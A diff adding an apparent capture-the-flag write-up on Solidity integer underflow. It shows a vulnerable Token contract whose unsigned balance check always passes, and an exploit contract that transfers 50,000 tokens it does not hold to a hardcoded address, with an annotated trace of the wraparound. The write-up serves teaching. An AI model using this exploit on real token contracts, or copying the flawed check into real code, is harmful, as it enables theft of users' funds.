@@ -1,0 +1,59 @@
+Contracts written earlier than v0.8.1 were vulnerable to integer over/underflow attacks. For example, if you have uint8 x = 255 then x + 1 will evaluate to 0 (overflow). Similarly, for uint8 x = 0, (x-1) becomes 255. In this challenge we use this vulnerability to steal 50,000 tokens from this contract.
+
+Here are both the problem and the solution contracts:
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Token {
+
+  mapping(address => uint) balances;
+  uint public totalSupply;
+
+  constructor(uint _initialSupply) public {
+    balances[msg.sender] = totalSupply = _initialSupply;
+  }
+
+  function transfer(address _to, uint _value) public returns (bool) {
+    require(balances[msg.sender] - _value >= 0);
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+  }
+
+  function balanceOf(address _owner) public view returns (uint balance) {
+    return balances[_owner];
+  }
+}
+
+contract Solution
+{
+  address tokenContract;
+  Token t;
+
+  constructor() public
+  {
+    //Deploy the contract and get 20 tokens
+    t = new Token(20);
+  }
+
+  function attack() public
+  {
+    // 0xaE036c65C649172b43ef7156b009c6221B596B8b gets the 50000 stolen tokens
+    t.transfer(address(0xaE036c65C649172b43ef7156b009c6221B596B8b), 50000);
+  }
+
+  function balanceOf(address addr) public view returns (uint)
+  {
+    return(t.balanceOf(addr));
+  }
+}
+
+Here is how the attack works:
+
+function transfer(address _to, uint _value) public returns (bool) {
+  require(balances[msg.sender] - _value >= 0);
+  balances[msg.sender] -= _value; // balances[msg.sender] = 20 - 50000 = 115792089237316195423570985008687907853269984665640564039457584007913129589956
+  balances[_to] += _value; // balances[0xaE036c65C649172b43ef7156b009c6221B596B8b] = 0 + 50000 = 50000 tokens
+  return true;
+}
